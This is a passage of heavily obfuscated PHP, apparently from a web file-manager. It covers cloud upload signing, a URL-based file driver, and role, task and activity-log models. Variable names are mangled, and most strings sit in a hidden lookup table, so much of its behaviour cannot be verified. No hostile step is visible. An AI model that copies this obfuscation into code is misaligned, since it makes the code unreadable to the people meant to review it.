$²ÀÃÏ­ô = 3600) { $³ÑÇå©Æ =& $_SERVER[ë¦»ºéÌ]; $šš¨š‰¥ = (int) $GLOBALS[$³ÑÇå©Æ[7]][$³ÑÇå©Æ[90]]; return $this->uploadPolicy($ıÆªê×è, $²ÀÃÏ­ô, $šš¨š‰¥); } private function uploadPolicy($õ÷‰Öª, $æğøë“Ñ = 3600, $áÈ¤×±€ = 0) { $€€î†£¿ =& $_SERVER[ë¦»ºéÌ]; $ôüô¤š = $€€î†£¿[8] . $this->bucket; $Ó‘™¸å = gmdate($€€î†£¿[1395]); $›°®îæÊ = array($€€î†£¿[1462] => $this->bucket, $€€î†£¿[1463] => $õ÷‰Öª, $€€î†£¿[1464] => time() + $æğøë“Ñ, $€€î†£¿[1465] => $Ó‘™¸å); if ($áÈ¤×±€) { $›°®îæÊ[$€€î†£¿[1375]] = $áÈ¤×±€; } $¿Ûƒáúê = base64_encode(json_encode($›°®îæÊ)); $ï«ş„œ = base64_encode(hash_hmac($€€î†£¿[1432], "\x50\x4f\x53\x54\x26{$ôüô¤š}\46{$Ó‘™¸å}\x26{$¿Ûƒáúê}", md5("{$this->userpass}"), !0)); $Ñ¥üúº = array($€€î†£¿[1300] => $¿Ûƒáúê, $€€î†£¿[1466] => "\125\x50\x59\125\116\x20{$this->username}\72{$ï«ş„œ}", $€€î†£¿[186] => $this->endpoint . $ôüô¤š); return $Ñ¥üúº; } public function download($É¾¾ƒÇæ, $±şÅíÆ) { $şé¶Şü = IO::getPathInner(IO::mkfile($±şÅíÆ)); if (!($¬ë†ËË = $this->link($É¾¾ƒÇæ))) { return !1; } $ºù˜ğ© = 0; $«¨‘Ã·Ê = 1024 * 200; $ğÑÆ“¥š = fopen($şé¶Şü, $_SERVER[ë¦»ºéÌ][1416]); while (!0) { $ƒ›«µÙ” = $this->fileSubstr($É¾¾ƒÇæ, $ºù˜ğ©, $«¨‘Ã·Ê); if ($ƒ›«µÙ” === !1) { return !1; } fwrite($ğÑÆ“¥š, $ƒ›«µÙ”); $ºù˜ğ© += $«¨‘Ã·Ê; if (strlen($ƒ›«µÙ”) < $«¨‘Ã·Ê) { break; } } fclose($ğÑÆ“¥š); return $±şÅíÆ; } public function link($€Š «æ, $»òÈ¦‚Ï = array()) { $âòåê»Ú =& $_SERVER[ë¦»ºéÌ]; $€Š «æ = trim($€Š «æ, $âòåê»Ú[8]); if (!empty($this->token)) { $Ş“ªò‰ğ = strtotime(date($âòåê»Ú[1467])); $îö±é¶¤ = substr(md5($this->token . $âòåê»Ú[290] . $Ş“ªò‰ğ . $âòåê»Ú[1468] . $€Š «æ), 12, 8) . $Ş“ªò‰ğ; $»òÈ¦‚Ï[] = $âòåê»Ú[1469] . $îö±é¶¤; } $šŞƒ“ = !empty($»òÈ¦‚Ï) ? $âòåê»Ú[83] . implode($âòåê»Ú[290], $»òÈ¦‚Ï) : $âòåê»Ú[12]; return $this->getHost() . $âòåê»Ú[8] . $€Š «æ . $šŞƒ“; } public function fileOut($˜èş™, $‹ßº¡Ûª = false, $øáãˆ—ø = false, $âñ‰¬Ø = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($˜èş™, $‹ßº¡Ûª, $øáãˆ—ø, $âñ‰¬Ø); } if (!$øáãˆ—ø) { $øáãˆ—ø = $this->pathThis($˜èş™); } $–¡ÙŠ¥» = $‹ßº¡Ûª ? array($_SERVER[ë¦»ºéÌ][1470] . rawurlencode($øáãˆ—ø)) : array(); $“ñ‰ÕÛõ = $this->link($˜èş™, $–¡ÙŠ¥»); $this->fileOutLink($“ñ‰ÕÛõ); } public function fileOutServer($œûˆéë, $£İ¨éåã = false, $“æé¡ı« = false, $ìˆĞ’÷³ = '') { parent::fileOut($œûˆéë, $£İ¨éåã, $“æé¡ı«, $ìˆĞ’÷³); } public function fileOutImage($ï¬«ì‘¤, $Í’†ø‡ª = 250) { $ÚšÚÆ˜½ = $this->link($ï¬«ì‘¤ . $_SERVER[ë¦»ºéÌ][1471] . $Í’†ø‡ª); $this->fileOutLink($ÚšÚÆ˜½); } public function fileOutImageServer($’äé’Õª, $±Ş”€‡ = 250) { parent::fileOutImage($’äé’Õª, $±Ş”€‡); } public function hashMd5($ØËú„Õ) { $¬®îâßì =& $_SERVER[ë¦»ºéÌ]; $§£ÓÙ¯ƒ = $this->_objectMeta($ØËú„Õ); return isset($§£ÓÙ¯ƒ[$¬®îâßì[219]]) ? $§£ÓÙ¯ƒ[$¬®îâßì[219]] : !1; } public function size($ÑûÁì®ô) { $ˆı¹ì” = $this->objectMeta($ÑûÁì®ô); return $ˆı¹ì” ? $ˆı¹ì”[$_SERVER[ë¦»ºéÌ][90]] : 0; } public function info($±¡°§’) { if ($this->isFolder($±¡°§’)) { return $this->folderInfo($±¡°§’); } else { if ($this->isFile($±¡°§’)) { return $this->fileInfo($±¡°§’); } } return !1; } public function exist($¡¶¢ë¡ù) { return $this->isFile($¡¶¢ë¡ù) || $this->isFolder($¡¶¢ë¡ù); } public function isFile($«©Æ­™½) { return !$this->isFolder($«©Æ­™½) && $this->objectMeta($«©Æ­™½); } public function isFolder($Ü«–È¡²) { return $this->cacheMethod($_SERVER[ë¦»ºéÌ][210], $Ü«–È¡²); } protected function objectMeta($èÑ°û¬£) { return $this->cacheMethod($_SERVER[ë¦»ºéÌ][211], $èÑ°û¬£); } protected function _objectMeta($ú¡€ËÂË) { $öáìÕ¯Ã =& $_SERVER[ë¦»ºéÌ]; if ($ú¡€ËÂË == $öáìÕ¯Ã[12] || $ú¡€ËÂË == $öáìÕ¯Ã[8]) { return array(); } $¸à˜¦â× = $this->ussRequest($ú¡€ËÂË, $öáìÕ¯Ã[1472]); if (!$¸à˜¦â×[$öáìÕ¯Ã[1169]]) { return null; } $’‹ÜÕì = isset($¸à˜¦â×[$öáìÕ¯Ã[1171]]) ? $¸à˜¦â×[$öáìÕ¯Ã[1171]] : array(); if (!isset($’‹ÜÕì[$öáìÕ¯Ã[1473]])) { return null; } $Í€›Á¾‘ = array($öáìÕ¯Ã[43] => isset($’‹ÜÕì[$öáìÕ¯Ã[1473]]) ? $’‹ÜÕì[$öáìÕ¯Ã[1473]] : null, $öáìÕ¯Ã[90] => isset($’‹ÜÕì[$öáìÕ¯Ã[1474]]) ? $’‹ÜÕì[$öáìÕ¯Ã[1474]] : null, $öáìÕ¯Ã[219] => isset($’‹ÜÕì[$öáìÕ¯Ã[1475]]) ? $’‹ÜÕì[$öáìÕ¯Ã[1475]] : null, $öáìÕ¯Ã[1442] => isset($’‹ÜÕì[$öáìÕ¯Ã[1476]]) ? $’‹ÜÕì[$öáìÕ¯Ã[1476]] : null); $Í€›Á¾‘[$öáìÕ¯Ã[1443]] = isset($’‹ÜÕì[$öáìÕ¯Ã[1477]]) ? strtotime($’‹ÜÕì[$öáìÕ¯Ã[1477]]) : $Í€›Á¾‘[$öáìÕ¯Ã[1442]]; return $Í€›Á¾‘; } protected function _isFolder($Å“†££ö) { $æšßöæ =& $_SERVER[ë¦»ºéÌ]; if ($Å“†££ö == $æšßöæ[12] || $Å“†££ö == $æšßöæ[8]) { return !0; } $Çã¤‡¹ñ = $this->_objectMeta($Å“†££ö); return isset($Çã¤‡¹ñ[$æšßöæ[43]]) && $Çã¤‡¹ñ[$æšßöæ[43]] == $æšßöæ[89] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($¾ÑÁ°ë = false) { } public function exist($‰é„ã¦±) { $ş’Á‡ã¡ = $this->info($‰é„ã¦±); return $ş’Á‡ã¡[$_SERVER[ë¦»ºéÌ][206]]; } public function isFile($º™“”) { $‘´Ë¨Èô = $this->info($º™“”); return $‘´Ë¨Èô[$_SERVER[ë¦»ºéÌ][206]]; } public function isFolder($ø¡ú‹¢ù) { return !1; } public function size($ç‡İé½¡) { $Ì°Éşî× = $this->info($ç‡İé½¡); return $Ì°Éşî×[$_SERVER[ë¦»ºéÌ][90]]; } public function info($‹®èÙïş) { return $this->infoParse($‹®èÙïş); } public function infoAuth($«Œ‘‘Ú) { return $this->infoParse($«Œ‘‘Ú); } public function infoWithChildren($—×Ğ‡Óì) { return $this->infoParse($—×Ğ‡Óì); } public function infoFull($ÉıÀ€‚¬) { return $this->infoParse($ÉıÀ€‚¬); } private function infoParse($ŠùÁ‹„) { $çÌÙ§Ñ€ =& $_SERVER[ë¦»ºéÌ]; $çª¬Å™ = $this->header($ŠùÁ‹„); if (!$çª¬Å™ || !$çª¬Å™[$çÌÙ§Ñ€[734]]) { return !1; } $¹‘ï¥üÕ = _get($çª¬Å™, $çÌÙ§Ñ€[343], 0); $­ÍóºÍ = array($çÌÙ§Ñ€[42] => $çª¬Å™[$çÌÙ§Ñ€[42]], $çÌÙ§Ñ€[88] => $ŠùÁ‹„, $çÌÙ§Ñ€[43] => $çÌÙ§Ñ€[204], $çÌÙ§Ñ€[90] => intval($¹‘ï¥üÕ), $çÌÙ§Ñ€[179] => get_path_ext($çª¬Å™[$çÌÙ§Ñ€[42]]), $çÌÙ§Ñ€[1356] => $¹‘ï¥üÕ > 0 && $çª¬Å™[$çÌÙ§Ñ€[1478]], $çÌÙ§Ñ€[1357] => !1); return $­ÍóºÍ; } private function header($ƒ­ÜºÌã) { $‰‘º˜ÜŒ =& $_SERVER[ë¦»ºéÌ]; if (isset(self::$_cacheHeader[$ƒ­ÜºÌã])) { return self::$_cacheHeader[$ƒ­ÜºÌã]; } $ÔÃß±äË = isset($GLOBALS[$‰‘º˜ÜŒ[1479]]) ? $GLOBALS[$‰‘º˜ÜŒ[1479]] : !1; $GLOBALS[$‰‘º˜ÜŒ[1479]] = !0; self::$_cacheHeader[$ƒ­ÜºÌã] = url_header($ƒ­ÜºÌã); $GLOBALS[$‰‘º˜ÜŒ[1479]] = $ÔÃß±äË; return self::$_cacheHeader[$ƒ­ÜºÌã]; } public function hashSimple($ á¦½Ù½, $·Ù£¹µ = false) { $ôøÈÍ•Š =& $_SERVER[ë¦»ºéÌ]; $¨ÑïĞ× = $this->info($ á¦½Ù½); if (!$¨ÑïĞ× || !$¨ÑïĞ×[$ôøÈÍ•Š[206]]) { return !1; } $åîä–æÊ = $¨ÑïĞ×[$ôøÈÍ•Š[90]]; $ïÍ•®Ü™ = 200; $¦ µÕ¨“ = 50; if ($åîä–æÊ <= $ïÍ•®Ü™ * $¦ µÕ¨“) { return md5($this->fileSubstr($ á¦½Ù½, 0, $åîä–æÊ)) . $åîä–æÊ; } $¥’İ‹¬ = intval($åîä–æÊ / $¦ µÕ¨“); $àíÁÔ = $ôøÈÍ•Š[12]; $„ÇÉêöŞ = timeFloat(); $æ…îçÊœ = 15; for ($åšÙ—€  = 0; $åšÙ—€  < $¦ µÕ¨“; $åšÙ—€ ++) { if (timeFloat() - $„ÇÉêöŞ > $æ…îçÊœ) { return !1; } $š©®Ï§Ğ = $this->fileSubstr($ á¦½Ù½, $¥’İ‹¬ * $åšÙ—€ , $ïÍ•®Ü™); if (!$š©®Ï§Ğ) { return !1; } $àíÁÔ .= $š©®Ï§Ğ; } $àíÁÔ .= $this->fileSubstr($ á¦½Ù½, $åîä–æÊ - $ïÍ•®Ü™, $ïÍ•®Ü™); return md5($àíÁÔ) . $åîä–æÊ; } public function getContent($ÌŸ—¾ö¾) { return $this->fileSubstr($ÌŸ—¾ö¾); } public function fileSubstr($×´¥­ëñ, $ƒ§±á‰µ = 0, $‡šâ¢ƒÁ = -1) { $¾•ªÔ«³ =& $_SERVER[ë¦»ºéÌ]; $±şÚîéõ = $this->info($×´¥­ëñ); if (!$±şÚîéõ || !$±şÚîéõ[$¾•ªÔ«³[206]] && $±şÚîéõ[$¾•ªÔ«³[90]] > 1024 * 1024 * 10) { return !1; } if ($‡šâ¢ƒÁ === -1) { $‡šâ¢ƒÁ = $±şÚîéõ[$¾•ªÔ«³[90]]; } if ($‡šâ¢ƒÁ == 0) { return $¾•ªÔ«³[12]; } $ª¤¾éŒ = array($¾•ªÔ«³[1480] . $ƒ§±á‰µ . $¾•ªÔ«³[766] . ($ƒ§±á‰µ + $‡šâ¢ƒÁ - 1)); $ˆ‚Ü×´¤ = url_request($×´¥­ëñ, $¾•ªÔ«³[237], !1, $ª¤¾éŒ, !1, !1, 1); return $ˆ‚Ü×´¤[$¾•ªÔ«³[1171]] ? $ˆ‚Ü×´¤[$¾•ªÔ«³[1171]] : $¾•ªÔ«³[12]; } public function download($©¯³ÖÒ¤, $ÎÙşßù±) { Downloader::start($©¯³ÖÒ¤, $ÎÙşßù±); return $ÎÙşßù±; } } goto cÒ„Ğ‰ÊÚ™; e³Ñ‚š±×Ş: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\155\x2e\162\x6f\154\x65\114\x69\163\x74"; public $field = array("\156\x61\155\x65", "\x61\165\x74\x68", "\154\x61\142\145\x6c", "\x64\x69\x73\x70\x6c\x61\171", "\x73\171\x73\x74\x65\x6d", "\144\x65\163\143", "\x69\147\156\x6f\x72\x65\x45\x78\164", "\x69\x67\x6e\157\x72\x65\x46\x69\x6c\x65\x53\151\172\145", "\x61\x64\x6d\151\x6e\x69\163\164\162\141\164\x6f\162", "\x73\x6f\x72\164"); public function listData($ŠÊ’Å = false, $”àœÙ“ = "\163\157\x72\164", $ì“¬¶ãø = false) { $Ë›·Ü˜‘ =& $_SERVER[ë¦»ºéÌ]; $¹¥îÒã™ = parent::listData($ŠÊ’Å, $”àœÙ“, $ì“¬¶ãø); if (!$ŠÊ’Å) { foreach ($¹¥îÒã™ as $à¶Îúƒ => $¶ç´–) { if ($¶ç´–[$Ë›·Ü˜‘[1993]] == 1) { $¹¥îÒã™[$à¶Îúƒ][$Ë›·Ü˜‘[453]] = LNG($Ë›·Ü˜‘[2221]); } } } return $¹¥îÒã™; } public function update($¶ÅĞ±œ, $×ı›€ö¾) { $šÒÇÍÇı =& $_SERVER[ë¦»ºéÌ]; $ğ‰‘¥æƒ = parent::listData($¶ÅĞ±œ); $¨¥ÌËİï = $this->findByName($×ı›€ö¾[$šÒÇÍÇı[42]]); if (!$ğ‰‘¥æƒ || $¨¥ÌËİï && $¨¥ÌËİï[$šÒÇÍÇı[403]] != $ğ‰‘¥æƒ[$šÒÇÍÇı[403]]) { return !1; } if ($¨¥ÌËİï[$šÒÇÍÇı[1993]] == 1) { $×ı›€ö¾ = array($šÒÇÍÇı[42] => $×ı›€ö¾[$šÒÇÍÇı[42]], $šÒÇÍÇı[1822] => $×ı›€ö¾[$šÒÇÍÇı[1822]]); } $this->filterAuth($×ı›€ö¾[$šÒÇÍÇı[416]]); return parent::update($¶ÅĞ±œ, $×ı›€ö¾); } public function remove($Àîö¾äŠ) { $üŸ™‡­¤ = parent::listData($Àîö¾äŠ); if (!$üŸ™‡­¤ || $üŸ™‡­¤[$_SERVER[ë¦»ºéÌ][1254]]) { return !1; } return parent::remove($Àîö¾äŠ); } public function add($ÕÌ§ Â) { $³çå§¼ =& $_SERVER[ë¦»ºéÌ]; $³‚ŞäÒø = $ÕÌ§ Â[$³çå§¼[42]]; if ($this->findByName($³‚ŞäÒø)) { return !1; } $„‚ê÷üÚ = array($³çå§¼[423] => $³‚ŞäÒø, $³çå§¼[1806] => $³çå§¼[12], $³çå§¼[1802] => $³çå§¼[1810], $³çå§¼[2222] => 1, $³çå§¼[1805] => 0, $³çå§¼[2223] => 0, $³çå§¼[1804] => $this->getSort()); $ÕÌ§ Â = array_merge($„‚ê÷üÚ, $ÕÌ§ Â); $this->filterAuth($ÕÌ§ Â[$³çå§¼[416]]); return parent::insert($ÕÌ§ Â); } private function getSort() { $›æ”·è– =& $_SERVER[ë¦»ºéÌ]; $¤“­·éÌ = parent::listData(); $ÅıÑô»¨ = array_to_keyvalue($¤“­·éÌ, $›æ”·è–[12], $›æ”·è–[1823]); return empty($ÅıÑô»¨) ? 0 : max($ÅıÑô»¨) + 1; } private function filterAuth(&$ŞÃ ‹’È) { $£ê•ˆ¡ =& $_SERVER[ë¦»ºéÌ]; $¹Ãñò ™ = array(); $Éà¼šòî = array_filter(explode($£ê•ˆ¡[60], $ŞÃ ‹’È)); foreach ($Éà¼šòî as $ŞÃ ‹’È) { $®Íè’ = explode($£ê•ˆ¡[10], $ŞÃ ‹’È); if ($®Íè’[0] == $£ê•ˆ¡[2224] && $®Íè’[1] != $£ê•ˆ¡[1173]) { $»Ÿ›Ô‚¿ = $®Íè’[0] . $£ê•ˆ¡[10] . $®Íè’[1] . $£ê•ˆ¡[2225]; if (!in_array($»Ÿ›Ô‚¿, $Éà¼šòî)) { $¹Ãñò ™[] = $»Ÿ›Ô‚¿; } } $¹Ãñò ™[] = $ŞÃ ‹’È; } $ŞÃ ‹’È = implode($£ê•ˆ¡[60], $¹Ãñò ™); } public function sort($ÌºŞ¦, $ğÈÕÁ¬‹) { return parent::update($ÌºŞ¦, $ğÈÕÁ¬‹); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\x6d\56\164\141\x73\x6b\x4c\x69\x73\164"; public $field = array("\x6e\x61\155\145", "\164\x79\160\145", "\145\x76\x65\x6e\164", "\164\151\x6d\145", "\144\x65\x73\143", "\163\171\163\164\145\x6d", "\145\156\x61\x62\x6c\145", "\154\x61\x73\164\122\165\156", "\163\157\162\x74"); public function listData($«¬ØÒ½” = false, $—öÉ¡¦÷ = "\x73\x6f\x72\164", $û”õãû = false) { return parent::listData($«¬ØÒ½”, $—öÉ¡¦÷, $û”õãû); } public function add($äÁ¤Òç) { $õïê³‰û =& $_SERVER[ë¦»ºéÌ]; $ıÑõºüÔ = $this->findByName($äÁ¤Òç[$õïê³‰û[42]]); if ($ıÑõºüÔ) { return !1; } $äÁ¤Òç[$õïê³‰û[1593]] = 0; $äÁ¤Òç[$õïê³‰û[1823]] = $this->getSort(); return parent::insert($äÁ¤Òç); } private function getSort() { $‘ÛÒË›ª =& $_SERVER[ë¦»ºéÌ]; $ÁÂØÑ‡ü = parent::listData(); $½ÛáÚ¶Ì = array_to_keyvalue($ÁÂØÑ‡ü, $‘ÛÒË›ª[12], $‘ÛÒË›ª[1823]); return empty($½ÛáÚ¶Ì) ? 0 : max($½ÛáÚ¶Ì) + 1; } public function update($×õ¿Úà, $–¶šã„) { $©ƒ„´¿´ =& $_SERVER[ë¦»ºéÌ]; $ÌªÇƒ™ = $this->listData($×õ¿Úà); $²ÁêëÂ” = $this->findByName($–¶šã„[$©ƒ„´¿´[42]]); if (!$ÌªÇƒ™ || $²ÁêëÂ” && $²ÁêëÂ”[$©ƒ„´¿´[403]] != $ÌªÇƒ™[$©ƒ„´¿´[403]]) { return !1; } return parent::update($×õ¿Úà, $–¶šã„); } public function remove($İ’ùç½, $Í´¦—ï = false) { $’í£ø… =& $_SERVER[ë¦»ºéÌ]; $äœßÙõ = $this->listData($İ’ùç½); if (!$äœßÙõ) { return; } if (!$Í´¦—ï && $äœßÙõ[$’í£ø…[1254]] == $’í£ø…[99]) { return !1; } return parent::remove($İ’ùç½); } public function enable($™‘ùïà, $÷Ù’»îµ) { return $this->update($™‘ùïà, array($_SERVER[ë¦»ºéÌ][2216] => $÷Ù’»îµ)); } public function run($ì¾ÃëÉ¾) { return $this->update($ì¾ÃëÉ¾, array($_SERVER[ë¦»ºéÌ][2226] => time())); } } goto D¼È’Æâ; E¡ßšˆ°¡ó: class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\163\x74\x65\x6d\137\154\x6f\147"; protected $dataAuto = array(array("\143\x72\x65\x61\164\145\x54\151\155\x65", "\164\151\x6d\x65", "\x69\156\163\x65\162\x74", "\146\x75\156\143\x74\151\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ÌÍöŠÙı =& $_SERVER[ë¦»ºéÌ]; return array($ÌÍöŠÙı[2118] => LNG($ÌÍöŠÙı[2119]), $ÌÍöŠÙı[2120] => LNG($ÌÍöŠÙı[2121]), $ÌÍöŠÙı[1743] => LNG($ÌÍöŠÙı[2122]), $ÌÍöŠÙı[2123] => LNG($ÌÍöŠÙı[2124]), $ÌÍöŠÙı[2125] => LNG($ÌÍöŠÙı[2126]), $ÌÍöŠÙı[2127] => LNG($ÌÍöŠÙı[2128]), $ÌÍöŠÙı[2129] => LNG($ÌÍöŠÙı[2130]), $ÌÍöŠÙı[1773] => LNG($ÌÍöŠÙı[2130]), $ÌÍöŠÙı[1774] => LNG($ÌÍöŠÙı[2131]), $ÌÍöŠÙı[2132] => LNG($ÌÍöŠÙı[2133]), $ÌÍöŠÙı[2134] => LNG($ÌÍöŠÙı[2135]), $ÌÍöŠÙı[2136] => LNG($ÌÍöŠÙı[2137]), $ÌÍöŠÙı[2138] => LNG($ÌÍöŠÙı[2139]), $ÌÍöŠÙı[1771] => LNG($ÌÍöŠÙı[2140]), $ÌÍöŠÙı[2141] => LNG($ÌÍöŠÙı[2142]), $ÌÍöŠÙı[1778] => LNG($ÌÍöŠÙı[2143]), $ÌÍöŠÙı[2144] => LNG($ÌÍöŠÙı[2145]), $ÌÍöŠÙı[2146] => LNG($ÌÍöŠÙı[2147]), $ÌÍöŠÙı[2148] => LNG($ÌÍöŠÙı[2149]), $ÌÍöŠÙı[2150] => LNG($ÌÍöŠÙı[2151]), $ÌÍöŠÙı[1781] => LNG($ÌÍöŠÙı[2152]), $ÌÍöŠÙı[1782] => LNG($ÌÍöŠÙı[2153]), $ÌÍöŠÙı[2154] => LNG($ÌÍöŠÙı[2155]), $ÌÍöŠÙı[2156] => LNG($ÌÍöŠÙı[2157]), $ÌÍöŠÙı[2158] => LNG($ÌÍöŠÙı[2159]), $ÌÍöŠÙı[1776] => LNG($ÌÍöŠÙı[2160]), $ÌÍöŠÙı[2161] => LNG($ÌÍöŠÙı[2162]), $ÌÍöŠÙı[1775] => LNG($ÌÍöŠÙı[2163]), $ÌÍöŠÙı[2164] => LNG($ÌÍöŠÙı[2165]), $ÌÍöŠÙı[2166] => LNG($ÌÍöŠÙı[2167]), $ÌÍöŠÙı[2168] => LNG($ÌÍöŠÙı[2169]), $ÌÍöŠÙı[2170] => LNG($ÌÍöŠÙı[2170]), $ÌÍöŠÙı[2171] => LNG($ÌÍöŠÙı[1747]), $ÌÍöŠÙı[2172] => LNG($ÌÍöŠÙı[2173]), $ÌÍöŠÙı[2174] => LNG($ÌÍöŠÙı[2175]), $ÌÍöŠÙı[2176] => LNG($ÌÍöŠÙı[2177]), $ÌÍöŠÙı[2178] => LNG($ÌÍöŠÙı[2179]), $ÌÍöŠÙı[2180] => LNG($ÌÍöŠÙı[2181]), $ÌÍöŠÙı[2182] => LNG($ÌÍöŠÙı[2182]), $ÌÍöŠÙı[2183] => LNG($ÌÍöŠÙı[2184]), $ÌÍöŠÙı[2185] => LNG($ÌÍöŠÙı[2186]), $ÌÍöŠÙı[2187] => LNG($ÌÍöŠÙı[2188]), $ÌÍöŠÙı[2189] => LNG($ÌÍöŠÙı[2190]), $ÌÍöŠÙı[2191] => LNG($ÌÍöŠÙı[2192]), $ÌÍöŠÙı[2193] => LNG($ÌÍöŠÙı[2194])); } private function typeFile() { $•ø‡İêğ =& $_SERVER[ë¦»ºéÌ]; $ğîğùˆ = array($•ø‡İêğ[1778] => array($•ø‡İêğ[1779]), $•ø‡İêğ[2136] => array($•ø‡İêğ[2195]), $•ø‡İêğ[2138] => array($•ø‡İêğ[2196]), $•ø‡İêğ[1771] => array($•ø‡İêğ[1772]), $•ø‡İêğ[2146] => array(), $•ø‡İêğ[2148] => array(), $•ø‡İêğ[2150] => array(), $•ø‡İêğ[1781] => array($•ø‡İêğ[1783]), $•ø‡İêğ[1782] => array($•ø‡İêğ[1783]), $•ø‡İêğ[2154] => array($•ø‡İêğ[2197]), $•ø‡İêğ[2156] => array($•ø‡İêğ[2197]), $•ø‡İêğ[2158] => array($•ø‡İêğ[2198]), $•ø‡İêğ[2144] => array($•ø‡İêğ[2199]), $•ø‡İêğ[1776] => array($•ø‡İêğ[2200]), $•ø‡İêğ[2161] => array($•ø‡İêğ[2201]), $•ø‡İêğ[1775] => array($•ø‡İêğ[1777])); return $ğîğùˆ; } private function typeAll() { $ç§Ùª˜Ç =& $_SERVER[ë¦»ºéÌ]; $ÕåõÉŠ‡ = $this->typeList; $ ù¼ú§÷ = array_filter($this->typeFile()); foreach ($ ù¼ú§÷ as $¦’°êÑÑ => $Ø‰¥‹å¥) { $ÕåõÉŠ‡[$Ø‰¥‹å¥[0]] = $ÕåõÉŠ‡[$¦’°êÑÑ]; } $ÕåõÉŠ‡[$ç§Ùª˜Ç[1783]] = LNG($ç§Ùª˜Ç[2202]); $ÕåõÉŠ‡[$ç§Ùª˜Ç[2197]] = LNG($ç§Ùª˜Ç[2203]); return $ÕåõÉŠ‡; } public function addLog($’œÕŸéá, $‡úî¨ÑÍ = array()) { $øœˆûö =& $_SERVER[ë¦»ºéÌ]; if (!isset($this->typeList[$’œÕŸéá])) { return; } $¦úñ†â = defined($øœˆûö[476]) && USER_ID ? USER_ID : (isset($‡úî¨ÑÍ[$øœˆûö[1632]]) ? $‡úî¨ÑÍ[$øœˆûö[1632]] : 0); if (!$¦úñ†â) { $¦úñ†â = (int) Session::get($øœˆûö[1932]); } $…ÕîÀ = get_client_ip(); if (!$‡úî¨ÑÍ || strlen(json_encode($‡úî¨ÑÍ)) >= 1024) { $‡úî¨ÑÍ = array($øœˆûö[2204] => $…ÕîÀ); } else { if (is_array($‡úî¨ÑÍ)) { $‡úî¨ÑÍ[$øœˆûö[2204]] = $…ÕîÀ; } else { $‡úî¨ÑÍ = array($øœˆûö[1171] => $‡úî¨ÑÍ, $øœˆûö[2204] => $…ÕîÀ); } } $‡úî¨ÑÍ = array($øœˆûö[1622] => Session::sign(), $øœˆûö[1623] => $¦úñ†â, $øœˆûö[43] => $’œÕŸéá, $øœˆûö[1625] => json_encode($‡úî¨ÑÍ)); parent::add($‡úî¨ÑÍ); } public function remove($ìŠ¦Æ») { $this->where(array($_SERVER[ë¦»ºéÌ][422] => $ìŠ¦Æ»))->delete(); } private function _makeOrder($…¸¸¢ï¿ = '') { $Ô—í¼í =& $_SERVER[ë¦»ºéÌ]; $Œï©¦ß = $Ô—í¼í[205]; $ÙŸÄÎè = array($Ô—í¼í[450] => $Ô—í¼í[451], $Ô—í¼í[452] => $Ô—í¼í[453]); $¢©õèÑ = Input::get($Ô—í¼í[458], $Ô—í¼í[7], $Ô—í¼í[1964], array($Ô—í¼í[1890], $Ô—í¼í[452])); $¢©õèÑ = $ÙŸÄÎè[$¢©õèÑ]; $…¸¸¢ï¿ = $…¸¸¢ï¿ . "{$Œï©¦ß}\40{$¢©õèÑ}"; return $this->order($…¸¸¢ï¿); } public function get($±‚ú å = '') { $Ñå½ªÁ´ =& $_SERVER[ë¦»ºéÌ]; if (!$±‚ú å) { show_json(array()); } $şïÎúË™ = array(); if ($±‚ú å[$Ñå½ªÁ´[1632]]) { $şïÎúË™[$Ñå½ªÁ´[1632]] = $±‚ú å[$Ñå½ªÁ´[1632]]; } if (isset($±‚ú å[$Ñå½ªÁ´[745]])) { $‹ø¯Å¹® = $±‚ú å[$Ñå½ªÁ´[745]]; $ºÎÚâ”ş = isset($±‚ú å[$Ñå½ªÁ´[498]]) ? $±‚ú å[$Ñå½ªÁ´[498]] : time(); $şïÎúË™[$Ñå½ªÁ´[205]] = array($Ñå½ªÁ´[339], array($‹ø¯Å¹®, $ºÎÚâ”ş)); } if ($±‚ú å[$Ñå½ªÁ´[43]]) { $•â…Óıš = explode($Ñå½ªÁ´[60], $±‚ú å[$Ñå½ªÁ´[43]]); $­¼·û¿› = $this->typeFile(); $ß½óİ× = array(); foreach ($•â…Óıš as $¤•èö‚‡) { $ß½óİ×[] = $¤•èö‚‡; if (isset($­¼·û¿›[$¤•èö‚‡])) { $ß½óİ× = array_merge($ß½óİ×, $­¼·û¿›[$¤•èö‚‡]); } } $ß½óİ× = array_unique($ß½óİ×); if ($ß½óİ×) { $şïÎúË™[$Ñå½ªÁ´[43]] = array($Ñå½ªÁ´[7], $ß½óİ×); } } else { $şïÎúË™[$Ñå½ªÁ´[43]] = array($Ñå½ªÁ´[2205], $Ñå½ªÁ´[2206]); } if (!empty($±‚ú å[$Ñå½ªÁ´[2204]])) { $şïÎúË™[$Ñå½ªÁ´[453]] = array($Ñå½ªÁ´[389], "\45{$±‚ú å[$Ñå½ªÁ´[2204]]}\x25"); } $êæİ®É“ = $this->_makeOrder()->where($şïÎúË™)->selectPage(); if (empty($êæİ®É“[$Ñå½ªÁ´[375]])) { show_json(array(), !0, $êæİ®É“[$Ñå½ªÁ´[372]]); } $êæİ®É“[$Ñå½ªÁ´[375]] = $this->logList($êæİ®É“[$Ñå½ªÁ´[375]]); return $êæİ®É“; } private function ipAddress(&$œêà¬šÎ) { $“µšİøï =& $_SERVER[ë¦»ºéÌ]; if (!empty($œêà¬šÎ[$“µšİøï[2204]])) { $şÜõİõÚ = IpLocation::get($œêà¬šÎ[$“µšİøï[2204]]); } else { $şÜõİõÚ = LNG($“µšİøï[2207]); } $œêà¬šÎ[$“µšİøï[2208]] = $şÜõİõÚ; } private function descZipDownload($¹¢¾ğ×ß, &$şØ„œŸŠ) { $Ú½ÉÃ†™ =& $_SERVER[ë¦»ºéÌ]; if (!isset($¹¢¾ğ×ß[$Ú½ÉÃ†™[2209]])) { return; } $ºÃ€³‡ = json_decode($¹¢¾ğ×ß[$Ú½ÉÃ†™[2209]], !0); foreach ($ºÃ€³‡ as $éº³Úêœ) { try { $àÍßøğ· = IO::infoFull($éº³Úêœ[$Ú½ÉÃ†™[88]]); } catch (Exception $É¯‚óõ) { continue; } $¹¢¾ğ×ß[$Ú½ÉÃ†™[88]] = 